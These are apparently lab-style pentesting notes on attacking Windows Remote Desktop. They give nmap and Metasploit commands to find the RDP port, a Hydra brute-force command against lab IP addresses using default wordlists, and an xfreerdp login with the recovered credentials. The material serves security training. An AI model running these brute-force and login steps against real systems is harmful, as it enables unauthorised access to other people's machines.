#### Exploiting RDP
- The Remote Desktop Protocol is a proprietary GUI  remote access protocol developed by Microsoft and is used to remotely connect and interact with windows system.
- RDP uses TCP PORT 3389 by default,and can also be configured to run on any other TCP port.
- RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text.
- we can perform an RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access to the target system.

#### Exploit
- nmap -sV 10.10.10.12[ confirmation for rdp,rdp can run any port]
- service postgresql start
- msfconsole
- search rdp_scanner
- use auxiliary/scanner/rdp/rdp_scanner
- set all requires options [ it can confirm setting different different port to which one is actual port for rdp if port is not default]
- run 
- this will confirm which rdp port and versions
##### Hydra
- hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.24.86 -s 3333 [brute force for user name and password,we need to set -s options for setting port as it is not using default port]
- from this we get password and user
##### xfreerdp 
- xfreedrp /u:adminitrator /p:qwertyuiop /v:10.10.10.12:3333 [here u:username p:password]
- this will give us a GUI to control victim pc remotely.
#### Note 
- others rdp clients are remmina,rdesktop,krdc etc.
